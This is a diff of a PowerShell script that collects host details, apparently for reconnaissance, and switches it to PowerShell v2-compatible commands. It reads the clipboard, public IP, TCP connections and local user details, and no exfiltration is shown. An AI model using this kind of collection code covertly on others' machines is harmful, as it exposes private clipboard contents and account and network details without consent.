@@ -133,17 +133,26 @@ $results += "`n"
 
 ### Gets public ip
 $results += "`nPublic IP `n"
-$results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
+### WORKS ONLY FOR PSv5
+#$results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
+### PSv2 alternative
+$results += (New-Object Net.WebClient).DownloadString('http://ipecho.net/plain')
 $results += "`n"
 
 ### Gets active tcp connections
 $results += "`nActive TCP connections `n"
-$results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
+### WORKS ONLY FOR PSv5
+# $results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
+### PSv2 alternative
+$results += netstat -an | Format-Table -HideTableHeaders | Out-String
 $results += "`n"
 
 ### Gets contents of clipboard
 $results += "`nClipboard content`n"
-$results += Get-Clipboard
+### WORKS ONLY ON PSv5
+#$results += Get-Clipboard
+### PSv2 alternative
+$results += add-type -as System.Windows.Forms; [windows.forms.clipboard]::GetText()
 $results += "`n"
 
 ### Gets information of installation settings
@@ -171,7 +180,7 @@ $results += "`nLocal users info `n"
 ### Powershell v2 incompatible!!!
 #$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String 
 ### PSv2 alternative
-$results += net user $env:UserName
+$results += net user $env:UserName | Format-Table -HideTableHeaders | Out-String
 $results += "`n"
 
 ### Checks if computer is in domain
